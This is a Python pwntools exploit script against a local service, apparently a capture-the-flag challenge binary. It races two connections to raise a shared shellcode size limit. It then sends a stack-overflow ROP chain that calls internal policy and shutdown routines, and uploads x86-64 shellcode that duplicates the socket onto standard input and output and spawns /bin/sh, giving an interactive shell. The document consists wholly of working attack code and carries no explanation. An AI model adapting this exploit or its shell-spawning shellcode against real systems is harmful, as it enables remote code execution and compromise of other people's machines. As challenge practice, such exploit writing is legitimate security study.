#!/usr/bin/env python3
from pwn import *
import time

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

HOST = "127.0.0.1"
PORT = 5555

OFFSET = 0x148
MAX = 0x400

UPDATE_POLICY   = 0x401436
WORKER_SHUTDOWN = 0x401999
CLOSE_PLT       = 0x401260

POP_RDI         = 0x4015ee
POP_RSI_R15     = 0x4015ec


def make_shellcode():
    return asm("""
        mov r12, rdi

        /* dup2(fd, 0) */
        mov edi, r12d
        xor esi, esi
        mov eax, 33
        syscall

        /* dup2(fd, 1) */
        mov edi, r12d
        mov esi, 1
        mov eax, 33
        syscall

        /* dup2(fd, 2) */
        mov edi, r12d
        mov esi, 2
        mov eax, 33
        syscall

        /* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
        xor edx, edx

        push rdx
        mov rbx, 0x68732f6e69622f
        push rbx
        mov rdi, rsp

        push rdx
        push rdi
        mov rsi, rsp

        mov eax, 59
        syscall
    """)


def exploit():


    A = remote(HOST, PORT)

    A.recvuntil(b"> ")
    A.sendline(b"1")

    A.recvuntil(b"Shellcode size: ")
    A.sendline(b"0x100")

    A.recvuntil(b"Preparing execution context...")
    log.success("A: inside preparation")



    B = remote(HOST, PORT)

    B.recvuntil(b"> ")
    B.sendline(b"1")

    B.recvuntil(b"Shellcode size: ")
    B.sendline(b"0x400")

    B.recvuntil(b"Shellcode is too large.")

    log.success("B: g_policy.max_size = 0x400")



    A.recvuntil(b"Send shellcode: ")

    log.success("A: reached vulnerable recv()")



    payload = b"A" * OFFSET



    payload += p64(POP_RDI)
    payload += p64(0x400)

    payload += p64(POP_RSI_R15)
    payload += p64(0)
    payload += p64(0)

    payload += p64(UPDATE_POLICY)



    payload += p64(POP_RDI)
    payload += p64(A.fileno())

    payload += p64(CLOSE_PLT)


    payload += p64(WORKER_SHUTDOWN)

    payload = payload.ljust(MAX, b"A")

    log.info(f"payload = 0x{len(payload):x}")
    log.info(f"offset  = 0x{OFFSET:x}")

    A.send(payload)

    log.success("A: ROP sent")

    time.sleep(0.3)

    A.close()


    log.info("B: uploading shellcode")

    B.recvuntil(b"> ")
    B.sendline(b"1")

    B.recvuntil(b"Shellcode size: ")

    sc = make_shellcode()

    log.info(f"shellcode size = 0x{len(sc):x}")

    B.sendline(str(len(sc)).encode())

    B.recvuntil(b"Send shellcode: ")
    B.send(sc)

    B.recvuntil(b"Shellcode accepted.")

    log.success("B: shellcode accepted")


    B.recvuntil(b"> ")
    B.sendline(b"3")

    log.info("B: starting shell")

    B.interactive()


if __name__ == "__main__":
    exploit()